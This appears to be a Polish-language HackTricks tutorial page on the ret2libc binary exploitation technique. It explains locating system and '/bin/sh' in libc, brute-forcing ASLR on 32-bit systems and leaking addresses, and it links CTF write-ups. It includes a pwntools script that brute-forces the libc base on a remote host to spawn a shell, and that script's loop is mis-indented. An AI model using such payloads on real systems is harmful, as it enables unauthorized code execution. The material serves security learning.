# Ret2lib

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **Podstawowe informacje**

IstotÄ… **Ret2Libc** jest przekierowanie przepÅ‚ywu wykonania podatnego programu do funkcji w bibliotece wspÃ³Å‚dzielonej (np. **system**, **execve**, **strcpy**) zamiast wykonywania kodu shell dostarczonego przez atakujÄ…cego na stosie. AtakujÄ…cy tworzy Å‚adunek, ktÃ³ry modyfikuje adres powrotu na stosie, aby wskazywaÅ‚ na poÅ¼Ä…danÄ… funkcjÄ™ bibliotecznÄ…, jednoczeÅ›nie zapewniajÄ…c, Å¼e wszelkie konieczne argumenty sÄ… poprawnie ustawione zgodnie z konwencjÄ… wywoÅ‚ania.

### **PrzykÅ‚adowe kroki (uproszczone)**

* Uzyskaj adres funkcji do wywoÅ‚ania (np. system) i polecenie do wywoÅ‚ania (np. /bin/sh)
* Wygeneruj Å‚aÅ„cuch ROP, aby przekazaÄ‡ pierwszy argument wskazujÄ…cy na ciÄ…g poleceÅ„ oraz przepÅ‚yw wykonania do funkcji

## Znajdowanie adresÃ³w

* ZakÅ‚adajÄ…c, Å¼e uÅ¼ywana jest `libc` z bieÅ¼Ä…cej maszyny, moÅ¼na znaleÅºÄ‡, gdzie zostanie zaÅ‚adowana w pamiÄ™ci za pomocÄ…:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

JeÅ›li chcesz sprawdziÄ‡, czy ASLR zmienia adres libc, moÅ¼esz to zrobiÄ‡:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* ZnajÄ…c uÅ¼ywanÄ… bibliotekÄ™ libc, moÅ¼na rÃ³wnieÅ¼ znaleÅºÄ‡ przesuniÄ™cie do funkcji `system` za pomocÄ…:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* ZnajÄ…c uÅ¼ywanÄ… bibliotekÄ™ libc, moÅ¼na rÃ³wnieÅ¼ znaleÅºÄ‡ przesuniÄ™cie do funkcji Å‚aÅ„cucha `/bin/sh` za pomocÄ…:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Korzystanie z gdb-peda / GEF

ZnajÄ…c uÅ¼ywanÄ… bibliotekÄ™ libc, moÅ¼na rÃ³wnieÅ¼ uÅ¼yÄ‡ Peda lub GEF, aby uzyskaÄ‡ adres funkcji **system**, funkcji **exit** oraz ciÄ…gu znakÃ³w **`/bin/sh`**:
```bash
p system
p exit
find "/bin/sh"
```
### Korzystanie z /proc/\<PID>/maps

JeÅ›li proces tworzy **dzieci** za kaÅ¼dym razem, gdy z nim rozmawiasz (serwer sieciowy), sprÃ³buj **odczytaÄ‡** ten plik (prawdopodobnie bÄ™dziesz musiaÅ‚ byÄ‡ rootem).

Tutaj moÅ¼esz znaleÅºÄ‡ **dokÅ‚adnie, gdzie jest zaÅ‚adowany libc** wewnÄ…trz procesu i **gdzie bÄ™dzie zaÅ‚adowany** dla kaÅ¼dego dziecka procesu.

![](<../../../.gitbook/assets/image (850).png>)

W tym przypadku jest zaÅ‚adowany pod adresem **0xb75dc000** (BÄ™dzie to adres bazowy libc)

## Nieznany libc

MoÅ¼e byÄ‡ moÅ¼liwe, Å¼e **nie znasz libc, ktÃ³re jest Å‚adowane przez binarny plik** (poniewaÅ¼ moÅ¼e znajdowaÄ‡ siÄ™ na serwerze, do ktÃ³rego nie masz dostÄ™pu). W takim przypadku moÅ¼esz wykorzystaÄ‡ podatnoÅ›Ä‡ do **wycieku pewnych adresÃ³w i znalezienia, ktÃ³ry libc** jest uÅ¼ywany:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

A szablon pwntools do tego znajdziesz tutaj:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### ZnajomoÅ›Ä‡ libc z 2 przesuniÄ™ciami

SprawdÅº stronÄ™ [https://libc.blukat.me/](https://libc.blukat.me/) i uÅ¼yj **kilku adresÃ³w** funkcji wewnÄ…trz libc, aby dowiedzieÄ‡ siÄ™, ktÃ³ra **wersja jest uÅ¼ywana**.

## Omijanie ASLR w 32 bitach

Te ataki brute-force sÄ… **przydatne tylko dla systemÃ³w 32-bitowych**.

* JeÅ›li exploit jest lokalny, moÅ¼esz sprÃ³bowaÄ‡ bruteforce'owaÄ‡ adres bazowy libc (przydatne dla systemÃ³w 32-bitowych):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* JeÅ›li atakujesz zdalny serwer, moÅ¼esz sprÃ³bowaÄ‡ **przeprowadziÄ‡ atak siÅ‚owy na adres funkcji `usleep` z biblioteki `libc`**, przekazujÄ…c jako argument 10 (na przykÅ‚ad). JeÅ›li w pewnym momencie **serwer potrzebuje dodatkowych 10 sekund na odpowiedÅº**, oznacza to, Å¼e znalazÅ‚eÅ› adres tej funkcji.

## One Gadget

Wykonaj powÅ‚okÄ™, skaczÄ…c do **jednego** okreÅ›lonego **adresu** w bibliotece `libc`:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## PrzykÅ‚ad kodu x86 Ret2lib

W tym przykÅ‚adzie atak siÅ‚owy ASLR jest zintegrowany w kodzie, a podatny plik binarny znajduje siÄ™ na zdalnym serwerze:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## PrzykÅ‚ad kodu x64 Ret2lib

SprawdÅº przykÅ‚ad z:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## PrzykÅ‚ad ARM64 Ret2lib

W przypadku ARM64 instrukcja ret skacze tam, gdzie wskazuje rejestr x30, a nie tam, gdzie wskazuje rejestr stosu. Jest to trochÄ™ bardziej skomplikowane.

Ponadto w ARM64 instrukcja wykonuje to, co ma wykonaÄ‡ (nie moÅ¼na skakaÄ‡ w Å›rodek instrukcji i przeksztaÅ‚caÄ‡ ich w nowe).

SprawdÅº przykÅ‚ad z:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (lub puts)

To pozwala na **wyciek informacji z procesu** poprzez wywoÅ‚anie `printf`/`puts` z okreÅ›lonymi danymi umieszczonymi jako argument. Na przykÅ‚ad umieszczenie adresu `puts` w GOT podczas wywoÅ‚ania `puts` spowoduje **wyciek adresu `puts` w pamiÄ™ci**.

## Ret2printf

Oznacza to w zasadzie naduÅ¼ycie **Ret2lib w celu przeksztaÅ‚cenia go w podatnoÅ›Ä‡ na Å‚aÅ„cuchy formatujÄ…ce `printf`**, korzystajÄ…c z `ret2lib` do wywoÅ‚ania printf z wartoÅ›ciami do jej wykorzystania (brzmi bezuÅ¼ytecznie, ale jest to moÅ¼liwe):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Inne PrzykÅ‚ady i odnoÅ›niki

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, majÄ…c wyciek do adresu funkcji w libc, korzystajÄ…c z jednego gadÅ¼etu
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bity, ASLR wÅ‚Ä…czone, ale brak PIE, pierwszym krokiem jest przepeÅ‚nienie aÅ¼ do bajtu 0x00 canary, a nastÄ™pnie wywoÅ‚anie puts i wyciek. Z canary tworzony jest gadÅ¼et ROP do wywoÅ‚ania puts w celu wycieku adresu puts z GOT, a nastÄ™pnie gadÅ¼et ROP do wywoÅ‚ania `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bity, ASLR wÅ‚Ä…czone, brak canary, przepeÅ‚nienie stosu w funkcji gÅ‚Ã³wnej z funkcji potomnej. GadÅ¼et ROP do wywoÅ‚ania puts w celu wycieku adresu puts z GOT, a nastÄ™pnie wywoÅ‚anie jednego gadÅ¼etu.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bity, brak pie, brak canary, brak relro, nx. UÅ¼ywa funkcji write do wycieku adresu write (libc) i wywoÅ‚uje jeden gadÅ¼et.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* UÅ¼ywa Å‚aÅ„cucha formatujÄ…cego do wycieku canary ze stosu i przepeÅ‚nienia buforu do wywoÅ‚ania systemu (jest w GOT) z adresem `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bity, brak relro, brak canary, nx, pie. NaduÅ¼ywa zÅ‚ego indeksowania do wycieku adresÃ³w libc i sterty ze stosu. NaduÅ¼ywa przepeÅ‚nienie buforu do wykonania ret2lib wywoÅ‚ujÄ…cego `system('/bin/sh')` (adres sterty jest potrzebny do ominiÄ™cia sprawdzenia).
